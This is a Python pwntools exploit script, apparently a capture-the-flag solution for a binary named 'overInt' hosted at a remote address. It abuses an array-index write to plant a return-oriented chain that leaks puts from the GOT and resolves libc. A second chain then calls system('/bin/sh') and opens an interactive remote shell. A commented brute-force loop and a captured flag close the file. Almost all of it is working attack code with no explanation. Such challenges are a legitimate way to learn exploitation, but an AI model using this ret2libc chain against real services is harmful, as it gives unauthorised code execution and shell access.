from pwn import *
from LibcSearcher import LibcSearcher
context.log_level = "debug"
key1 = "!!@m"
key2 = 0x20633372

# buf = [ i for i in range(4)]
# char_list = "!@m#$%^&*()_+1234567890-=qwertyuioplkjhgfdsazxcvbnmQWERTYUIOPLKJHGFDSAZXCVBNM,./"
# char_list = [ord(i) for i in char_list]
# length = len(char_list)

# for i in range(length):
# 	for j in range(length):
# 		for k in range(length):
# 			for t in range(length):
# 				buf[0] = char_list[i]
# 				buf[1] = char_list[j]
# 				buf[2] = char_list[k]
# 				buf[3] = char_list[k]
# 				index = 0
# 				for c in range(4):
# 					index = (((buf[c] >> 4) + 4 * index) & 0xff) ^ ((buf[c] << 10) & 0xff);
# 				result = 47 if ( ((index % 47) + (index % 47 ))< 0 )else 0
# 				num = u32("".join([chr(temp) for temp in buf]))
# 				if (result == 35 ) and ((num+magic) & 0xffffffff) <= 4 :
# 					print([chr(temp) for temp in buf])
# 					exit(0)
# 				print(buf)
# p = process("./overInt")
p = remote("58.20.46.151" , 35875)
elf = ELF("./overInt")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
def prepare():
	p.recvuntil("Please set arrary number: \n")
	p.send(key1)
	p.recvuntil("do you have?\n")
	p.send(p32(5))
	p.recvuntil("is: \n")
	p.send(p32(key2))
	for i in range(4):
		p.recvuntil("is: \n")
		p.send("0")

def overwrite(offset , addr):
	for i in range(8):
		p.recvuntil(" modify?\n")	
		p.send(p32(offset + i))
		p.recvuntil("write in?\n")
		p.send(addr[i])
	return offset + 8
prepare()
offset = 0x30 + 8
puts_plt = elf.plt["puts"]
puts_got = elf.got["puts"]
pop_rdi_ret = 0x400b13
main = 0x40087F

payload_length = 4
p.recvuntil("How many positions you want to modify?\n")
p.send(p32(payload_length * 8))

offset = overwrite(offset , p64(pop_rdi_ret))
offset = overwrite(offset , p64(puts_got))
offset = overwrite(offset , p64(puts_plt))
offset = overwrite(offset , p64(main))
p.recvuntil("hello!")
puts_addr = u64(p.recvuntil("\x0a")[:-1].ljust(8 , "\x00"))
log.info("puts_addr :" + hex(puts_addr))
libc = LibcSearcher("puts" , puts_addr)
libc_base = puts_addr - libc.dump("puts")
system = libc_base + libc.dump("system")
str_bin_sh = libc_base + libc.dump("str_bin_sh")
# libc_base = puts_addr - libc.sym["puts"]
# system = libc_base + libc.sym["system"]
# str_bin_sh = libc_base + libc.search("/bin/sh").next()
log.info("libc_base : " + hex(libc_base))
log.info("system : " + hex(system))
log.info("str_bin_sh : " + hex(str_bin_sh))
# next_turn to getshell
prepare()
offset = 0x30 + 8

payload_length = 3
p.recvuntil("How many positions you want to modify?\n")
p.send(p32(payload_length * 8))

offset = overwrite(offset , p64(pop_rdi_ret))
offset = overwrite(offset , p64(str_bin_sh))
offset = overwrite(offset , p64(system))
p.recvuntil("hello!")
p.interactive()

# flag{564a8646fa68f486a464s6f486a4f86as46}